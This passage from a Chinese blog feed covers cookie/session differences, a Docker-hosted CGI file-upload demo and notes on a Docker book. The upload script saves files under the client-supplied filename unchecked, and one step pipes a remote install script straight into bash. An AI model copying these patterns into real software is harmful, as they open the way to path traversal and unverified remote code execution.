Cookie</strong>，这里直接贴出文章。本来想总结一下 ， 已经有写好的了，自己也学习一下</p><blockquote><p> <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2hpeWFuZ3h0L2FydGljbGVzLzEzMDU1MDYuaHRtbA==" title="https://www.cnblogs.com/shiyangxt/articles/1305506.html">cookie 和session 的区别详解<i class="fa fa-external-link"></i></span></p></blockquote><p>cookie 和session 的区别：</p><ol><li><p><strong>cookie数据存放在客户的浏览器上，session数据放在服务器上</strong></p></li><li><p>cookie不是很安全，<strong>别人可以分析存放在本地的COOKIE</strong>并进行COOKIE欺骗考虑到安全应当使用session。</p><p>httpOnly ：JS 无法读取到 cookie</p></li><li><p>session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能考虑到减轻服务器性能方面，应当使用COOKIE。</p></li><li><p>单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。</p><p><strong>这里比较好玩， 可以将 Cookie 设置为 大于 4096 的kv，这样的话，将会直接导致 客户端的 Deny</strong></p></li><li><p>所以个人建议：</p><p>将登陆信息等重要信息存放为SESSION （存在 Session 注入的问题？）<br>其他信息如果需要保留，可以放在COOKIE中</p></li></ol><h2 id="知识树"><a href="#知识树" class="headerlink" title="知识树"></a>知识树</h2><p>这个比较好玩， 以后每次类似的 blog 的时候就加上 吧，做个自己的思路方向的记录：</p><ul><li>nginx 的 LB<ul><li>通过 域名 的TCP 转发可行性</li><li>nginx 的 LB 的种类<ul><li>IP_hash 的问题</li><li>URL_hash 的 session问题<ul><li>session和Cookie<ul><li>httpOnly</li></ul></li></ul></li></ul></li></ul></li></ul><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;p&gt;突然又是折腾了一波nginx，其中一点点的配置和过程在这里记录一下。&lt;/p&gt;
&lt;p&gt;下午又把 《社交网络》这部片看了一遍，又
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Nginx" scheme="https://blog.diglp.xyz/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>Docker 初步</title>
    <link href="https://blog.diglp.xyz/2019/01/08/OP_Docker_proj/"/>
    <id>https://blog.diglp.xyz/2019/01/08/OP_Docker_proj/</id>
    <published>2019-01-07T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这篇，是一个Docker 的实战篇，使用Docker实现一个文件上传的web页面。ps：本来是要实现上传后自动编译并且允许返回结果的。因为各种原因就烂尾了，就这样吧先。</p><p>因为这篇，是比较基础的操作，很多东西还是有悖了Docker的 <strong>Build，ship，and run</strong> 的思想。这里还需要进行手动，所以显得比较有悖初衷。不过做一个过程的记录还是可以的。</p><hr><p>后面就打算实现一个标标准准的Docker 的工程，体现出 <strong>微服务</strong> 的思想。</p><blockquote><p>Docker 的一个容器理应是只跑一个进程（服务）的。</p></blockquote><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p>先从Dockerhub上拉镜像，这里需要 Nginx 和 Uwsgi，这里选取了<span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9yL3RpYW5nb2xvL3V3c2dpLW5naW54" title="https://hub.docker.com/r/tiangolo/uwsgi-nginx">tiangolo/uwsgi-nginx<i class="fa fa-external-link"></i></span> 这个镜像。 </p><p>在启动镜像的时候使用交互模式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 80:80 --name test2 docker.io/tiangolo/uwsgi-nginx:latest /bin/sh</span><br></pre></td></tr></table></figure><p>这个时候，Dockerfile 里面的CMD命令将会被重载为后面的 <code>/bin/sh</code></p><p>在交互模式下，attach 了容器之后，可以使用 <code>ctrl+p，ctrl+q</code> 组合键进行 detach</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker attach bf00008eee04</span><br><span class="line">docker attach test2</span><br></pre></td></tr></table></figure><hr><p>创建挂载卷容器，在对应的环境 编译 uwsgi， 之后可以之间拷贝到本地</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -tdi -v /tmp/tttmm/:/tmp/mm --name share docker.io/tiangolo/uwsgi-nginx:latest /bin/bash</span><br></pre></td></tr></table></figure><p>这里使用 bash 好用得多。另外这里附上 uwsgi 的CGI版本的一键编译的script：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://uwsgi.it/install | bash -s cgi /tmp/uwsgi</span><br></pre></td></tr></table></figure><hr><h2 id="CGI-部署"><a href="#CGI-部署" class="headerlink" title="CGI 部署"></a>CGI 部署</h2><p>跑一个综合的容器， 有端口映射以及卷挂载功能：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -tdi -p 80:80 -v /tmp/tttmm/:/tmp/mm --name share docker.io/tiangolo/uwsgi-nginx:latest /bin/bash</span><br></pre></td></tr></table></figure><p>由于 镜像自带的uwsgi 的版本是app的，其没有编译 CGI 功能。所以在这里需要进行替换。之间在容器内使用上述命令进行编译。对 <code>/usr/local/bin/uwsgi</code> 进行替换，对配置文件进行修改</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">socket</span> = /tmp/uwsgi.sock</span><br><span class="line"><span class="attr">chown-socket</span> = nginx:nginx</span><br><span class="line"><span class="attr">chmod-socket</span> = <span class="number">664</span></span><br><span class="line"><span class="attr">hook-master-start</span> = unix_signal:<span class="number">15</span> gracefully_kill_them_allroot@<span class="number">251</span>a2c8dc0b2:/usr/local/bin#</span><br></pre></td></tr></table></figure><p>这里是用户自定义的：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">plugins</span> = cgi</span><br><span class="line"><span class="attr">cgi</span> = /app</span><br><span class="line"><span class="attr">cgi-allowed-ext</span> = .py</span><br><span class="line"><span class="attr">cgi-helper</span> = .py=python</span><br></pre></td></tr></table></figure><p>指定CGI根目录，以及对应的后缀文件的解析器。后面再修改Nginx配置即可。</p><hr><p>编写实例 CGI 脚本。使用其标准输出作为页面内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Content-Type: text/html"</span>)</span><br><span class="line">print(<span class="string">""</span>)</span><br><span class="line">print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;First CGI server Base on Docker&lt;/h2&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;p&gt;Hello ann&lt;/p&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;p&gt;cause you are my world XD&lt;/p&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure><hr><p>至此，启动 <code>/usr/bin/supervisord</code> 便可以启动相关进程</p><blockquote><p>Supervisor (<span class="exturl" data-url="aHR0cDovL3N1cGVydmlzb3JkLm9yZy8=" title="http://supervisord.org/">http://supervisord.org<i class="fa fa-external-link"></i></span>) 是一个用 Python 写的进程管理工具，可以很方便的用来启动、重启、关闭进程（不仅仅是 Python 进程）。除了对单个进程的控制，还可以同时启动、关闭多个进程，比如很不幸的服务器出问题导致所有应用程序都被杀死，此时可以用 supervisor 同时启动所有应用程序而不是一个一个地敲命令启动。</p></blockquote><p>在客户端使用 浏览器请求便可以得到返回结果</p><hr><h2 id="Post-文件以及编译执行"><a href="#Post-文件以及编译执行" class="headerlink" title="Post 文件以及编译执行"></a>Post 文件以及编译执行</h2><p>前面实现了一个简单的CGI, 后面开始完善整个功能，实现文件的POST 上传以及在线的编译。</p><p>先需要对 Nginx 配置进行修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root /app/html;# 这里是页面的目录</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /cgi-bin &#123;</span><br><span class="line">        root /app/cgi-bin;# cgi 的目录</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">uwsgi_modifier1 9;</span><br><span class="line">        uwsgi_pass unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重启 Nginx 的服务，使其配置生效，测试 页面 以及 CGI 脚本。</p><p>这里先构建文件的上传入口，简易的上传 页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>update<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>UploadPoint<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"upload-form"</span> <span class="attr">action</span>=<span class="string">"/cgi-bin/upload.py"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> &gt;</span></span><br><span class="line">        　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"upload"</span> <span class="attr">name</span>=<span class="string">"upload"</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Upload"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以及后端的实现文件保存以及编译的功能</p><p>下面是CGI代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb </span><br><span class="line"></span><br><span class="line">form = cgi.FieldStorage() </span><br><span class="line">fileitem = form[<span class="string">'upload'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> fileitem.filename:</span><br><span class="line">    print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;meta charset=\"utf-8\"&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;title&gt;succeed&lt;/title&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;h2&gt; 输入的内容是：%s&lt;/h2&gt;"</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'tmpfile/'</span> + fileitem.filename, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(fileitem.file.read())</span><br><span class="line">        print(<span class="string">'&lt;p&gt;文件已保存&lt;/p&gt;'</span>)</span><br><span class="line">    print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    text_content = <span class="string">"没有内容"</span></span><br><span class="line">    print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;meta charset=\"utf-8\"&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;title&gt;failed&lt;/title&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;h2&gt; 输入的内容是：%s&lt;/h2&gt;"</span> % text_content)</span><br><span class="line">    print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line">    print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly91d3NnaS1kb2NzLXpoLnJlYWR0aGVkb2NzLmlvL3poX0NOL2xhdGVzdC9DR0kuaHRtbA==" title="https://uwsgi-docs-zh.readthedocs.io/zh_CN/latest/CGI.html">在uWSGI上运行CGI脚本<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2xpeWFuZ2xpYW5nLm1lL3Bvc3RzLzIwMTUvMDYvdXNpbmctc3VwZXJ2aXNvci8=" title="http://liyangliang.me/posts/2015/06/using-supervisor/">使用 supervisor 管理进程<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9yL3RpYW5nb2xvL3V3c2dpLW5naW54" title="https://hub.docker.com/r/tiangolo/uwsgi-nginx">镜像地址 tiangolo/uwsgi-nginx<i class="fa fa-external-link"></i></span></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;这篇，是一个Docker 的实战篇，使用Docker实现一个文件上传的web页面。ps：本来是要实现上传后自动编译并且允许返回结果的。因为各种原因就
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Docker" scheme="https://blog.diglp.xyz/tags/Docker/"/>
    
      <category term="CGI" scheme="https://blog.diglp.xyz/tags/CGI/"/>
    
  </entry>
  
  <entry>
    <title>读本好书 《Docker 进阶与实践》</title>
    <link href="https://blog.diglp.xyz/2018/12/31/Book_Docker%E8%BF%9B%E9%98%B6%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <id>https://blog.diglp.xyz/2018/12/31/Book_Docker进阶与实践/</id>
    <published>2018-12-30T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：Docker 进阶与实践</li><li>作者：华为Docker实践小组</li><li>ISBN：9787111523390</li></ul><hr><p>这本书作为一个 对 Docker 的系统的学习和了解，由理论到实践，讲解了Docker 技术，以及其应用。</p><p>粗浅阅读，作为对Docker 了解，准备一个简单的project。（在线编译器？）</p><h2 id="Docker-简介"><a href="#Docker-简介" class="headerlink" title="Docker 简介"></a>Docker 简介</h2><p>其核心的思想是 ： <strong>Build Ship and Run</strong>。 </p><p>在磁盘占用，性能以及效率都在传统的虚拟化技术上有了明显的提高。</p><ul><li><p>Docker 之于传统的虚拟化技术是没有 Hypervisor 层。</p></li><li><p>Docker 使用了层级镜像的应用，可以实现存储空间的复用。</p></li></ul><hr><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><ul><li><p>Docker 客户端</p><p>使用 command 发起请求，或者使用 RESTful API 进行请求</p></li><li><p>Docker deamon</p><p>整个Docker 的核芯引擎，可以理解为 Docker Server。</p></li><li><p>Docker 容器</p><p>容器是一个核心内容，很好的诠释了集装箱的概念，可以实现一个标准隔离执行环境。</p><p>迁移和部署的时候，不用关心容器里面是装了什么，也不需要了解是怎么配置。整个就是一个一切完整的集装箱。 </p></li><li><p>Docker 镜像</p><p>可以理解为 容器是镜像的实例， 镜像是容器的模板。</p></li><li><p>Registry</p><p>可以理解为镜像站点，可以直接使用 pull 从其拉去镜像。</p></li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在内核编译的阶段，需要开启 <code>Cgroup</code> 以及 <code>Namespace</code>的编译选项。</p><h3 id="Docker-的基本使用"><a href="#Docker-的基本使用" class="headerlink" title="Docker 的基本使用"></a>Docker 的基本使用</h3><p>直接键入docker 会得到其提示页面， 使用 <code>docker COMMAND --help</code>可以直接显示相关的帮助页面</p><h2 id="容器技术"><a href="#容器技术" class="headerlink" title="容器技术"></a>容器技术</h2><p>在社区的合作下形成了Cgroup 以及 namespace 。</p><ul><li>Mount Namespace</li><li>UTS Namespace</li><li>IPC Namespace</li><li>PID Namespace</li><li>Net Namespace</li><li>User Namespace</li></ul><hr><p>Cgroup :</p><ul><li>cpuset</li><li>CPU</li><li>memory</li><li>device</li><li>freezer</li><li>blkio</li></ul><hr><h3 id="容器组成"><a href="#容器组成" class="headerlink" title="容器组成"></a>容器组成</h3><p>容器技术通过 Cgroup 和 Namespace 为核心技术。在其基础上由了根文件系统，以及容器引擎。书中有以下公式：</p><blockquote><p><code>容器 = cgroup + namespace + rootfs + 容器引擎(用户态工具)</code></p></blockquote><ul><li>Cgroup: 资源控制</li><li>Namespace: 访问隔离</li><li>rootfs： 文件系统隔离</li><li>容器引擎: 生命周期控制</li></ul><h3 id="容器的创建"><a href="#容器的创建" class="headerlink" title="容器的创建"></a>容器的创建</h3><p>书中的这里使用了三段伪代码，来说明一个容器的构成，这里说下自己的理解。</p><ol><li><p>通过系统的clone调用，来传入各个的Namespace的Clone flag，对其命名空间进行拷贝 ，之后得到一个新的进程，这个进程就会拥有一个属于自己的 clone 的Namespace。</p></li><li><p><code>echo $pid &gt; /sys/fs/cgroup/cpu/tesks</code> 建立的进程的PID 写入了各个 Cgroup的子系统之中，受到相应的Cgroup的子系统控制。</p></li><li>通过 系统调用，使得进程可以进入一个 新的 rootfs ，之后使用 <code>exec(&quot;/bin/bash&quot;)</code> 来启动一个 shell。</li></ol><p>这样就完成了一个容器的创建</p><hr><h3 id="Cgroup"><a href="#Cgroup" class="headerlink" title="Cgroup"></a>Cgroup</h3><p><strong>Cgroup 的目的就是实现了对与系统资源的<code>QoS</code></strong></p><p>在CG 之前，通过 sched_setaffinity 设定一个进程的CPU 亲和性（nginx中的配置）。</p><blockquote><p><code>$$</code> 表示当前进程的PID</p></blockquote><p>用户可以甚至可以新建自己的 Cgroup的规则，系统默认的规则在 <code>/sys/fs/cgroup</code> 下面进行配置</p><p>对进程配置生效，只需要将pid 写入以下文件 ： <code>/sys/fs/cgroup/pids</code>  这样是整个的 Cgroup 规则对当前进程生效。</p><p>或者，可以直接配置独立项目里面的 xxx.procs 。</p><p>blkio子系统        可以对块设备的I/O带宽进行限制。</p><p>devices子系统     可以对设备的权限进行控制 <code>a *.* rmw</code> 代表所有设备可被访问 <code>c 1:3 r</code> 控制 主设备号:子设备号设备 只读</p><h3 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h3><p>将内核的全局资源做封装，每一个NS 都有其独立的资源拷贝。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /proc/$$/ns</span><br></pre></td></tr></table></figure><p>查看当前的进程的namespace。</p><p>可以很容易的使用 系统调用建立一个独立的namespace的进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">stack</span>[STACK_SIZE];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* <span class="keyword">const</span> child_args[] = &#123;<span class="string">"/bin/bash"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">child</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  execv(<span class="string">"/bin/bash"</span>, child_args);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span> pid;</span><br><span class="line">  pid = clone(child, <span class="built_in">stack</span>+STACK_SIZE, SIGCHLD|CLONE_NEWUTS, <span class="literal">NULL</span>);<span class="comment">// 这里配置克隆命名空间的操作</span></span><br><span class="line">  waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接 GCC 编译， 在返回的SHELL 里，对hostname 进行修改 ，logout 之后，原shell中的hostname并没有被改变。</p><p>如前面提到的，namespace 有几个种类，</p><table><thead><tr><th>type</th><th>desc</th></tr></thead><tbody><tr><td>UTS</td><td>struct utsname ，uname 系统调用里面的结构体</td></tr><tr><td>IPC</td><td>进程间通信的隔离，如消息队列？ ipcmk</td></tr><tr><td>PID</td><td>PID 之间的隔离，（ps从procfs里读取），实际上的操作是隔离的，如kill</td></tr><tr><td>Mount</td><td>挂载点隔离</td></tr><tr><td>Network</td><td>网络接口隔离</td></tr><tr><td>User</td><td>用户以及用户权限隔离</td></tr></tbody></table><h2 id="Docker-的镜像"><a href="#Docker-的镜像" class="headerlink" title="Docker 的镜像"></a>Docker 的镜像</h2><p>image是启动容器的只读模板，是容器启动需要的rootfs。下面是一些 词汇：</p><table><thead><tr><th>word</th><th>meaning</th></tr></thead><tbody><tr><td>doker hub</td><td>可以理解为一个镜像站</td></tr><tr><td>Namespace</td><td>类似 Github 中的命名空间，代表一个种类，用户或组织</td></tr><tr><td>Repository</td><td>一个 Git 仓库，可以有多个镜像</td></tr><tr><td>Tag</td><td>类似Git 的tag，区别于不同的版本</td></tr><tr><td>Layer</td><td>类似于Git的 <strong>commit</strong> ，一个长的 Hash 串</td></tr><tr><td>Image ID</td><td>镜像的唯一标识，可以等同 repo:tag</td></tr></tbody></table><p>后面的部分简述了，<strong>build，ship and run </strong> 的操作。</p><hr><p>Docker 的image的组织结构，颗粒理解为积木堆叠的形式。书中对其源文件做了探索：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull busybox# 拉取镜像</span><br><span class="line">docker history busybox# 查看镜像的历史版本</span><br><span class="line">docker inspect busybox:latest</span><br></pre></td></tr></table></figure><hr><h3 id="Docker-image-的技术亮点"><a href="#Docker-image-的技术亮点" class="headerlink" title="Docker image 的技术亮点"></a>Docker image 的技术亮点</h3><ul><li><p>联合挂载</p><p>可以把多个目录同时挂载到同一个目录。</p></li><li><p>写时复制</p><p>在和系统调用的 <code>fork</code>类似，在创建子进程的时候，并不进行新的一个内存区的复制，而是在修改了共享的内的时候触发了一次缺页的中断，这时候进行一次页分配。这时候才会有真正的写。</p></li></ul><h2 id="仓库进阶"><a href="#仓库进阶" class="headerlink" title="仓库进阶"></a>仓库进阶</h2><p>git 的思想， 可以很容易的进行 <code>pull/push</code></p><h2 id="容器间的网络"><a href="#容器间的网络" class="headerlink" title="容器间的网络"></a>容器间的网络</h2><p>这里是在实践过程中比较重要的一部分。过程较为复杂，这里记录一些 kword <code>Weave</code>，<code>Flannel</code>，这些是现有的Docker 的网络解决方案</p><ul><li>Weave</li><li>Flannel</li><li>SocketPlane</li></ul><h2 id="容器卷管理"><a href="#容器卷管理" class="headerlink" title="容器卷管理"></a>容器卷管理</h2><p>在执行 <code>run/create</code> 使用 <code>-v</code> 来添加数据卷 volume，当然也可以将主机上的卷挂载到 容器中来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -v /var/vol --name mytest busybox# 添加新的卷</span><br><span class="line">docker run -d -v /var/vol:/home/test --name mytest busybox# 挂载主机卷</span><br></pre></td></tr></table></figure><p>可以创建一个共有的存储容器，在其他的实例上使用 <code>--vloume-from</code> 来共享卷</p><hr><p>问题：数据卷的悬挂问题</p><p>在删除容器的时候，需要显式的指明所挂载的卷，分配卷的空间才会被删除，如果不指定，就会出现数据卷的悬挂（dangling），浪费大量空间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm mytest</span><br><span class="line">docker rm mytest -v /var/vol</span><br></pre></td></tr></table></figure><h2 id="Docker-API"><a href="#Docker-API" class="headerlink" title="Docker API"></a>Docker API</h2><p>Docker 的API 设计 满足 <strong>RESTful(Representational State Transfer)</strong> 表达性状态转移。其API 设计：清晰，简单，低耦合，无状态，面向资源。</p><p>Docker 提供了API接口，使得其拓展性得到极大的提高。有提供三类API：</p><ul><li>Docker Remote API    比如 docker run 这种服务控制的命令</li><li>Docker Registry API    可以用来控制镜像存储</li><li>Docker Hub API        与Docker 的关系不大</li></ul><hr><p>示例请求，Docker 在启动的时候，会默认开启API，并且监听本地的unix 套接字，默认值为 <code>unix:///var/run/docker.sock</code>，可以直接向套接字写内容从而实现了API的调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里直接向套接字写了HTTP的请求，server 会直接返回了当前的所有的镜像的状态。</p><hr><p>当然，Docker 也会监听 <code>localhost:5678</code> 作为API 的请求端口，（之前有用过一个 GUI 的Docker的管理工具，其核心就是通过API与服务进行交互）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -XGET localhost:5678/image/debian/history| python -m json.tool# 等同：</span><br><span class="line">docker history debian</span><br></pre></td></tr></table></figure><hr><p>Docker API 的监听在其启动的时候进行配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -d -H unix:///var/run/docker.sock -H tcp://localhost:32768</span><br></pre></td></tr></table></figure><hr><h3 id="API的应用场景"><a href="#API的应用场景" class="headerlink" title="API的应用场景"></a>API的应用场景</h3><p>书中在这里以神奇的背景展开了一个使用案例：</p><ul><li>一个python 写的httpserver</li><li>打包成一个 Docker 镜像<ul><li>Dockerfile 和其依赖的文件打压缩包</li><li>使用远程的Docker 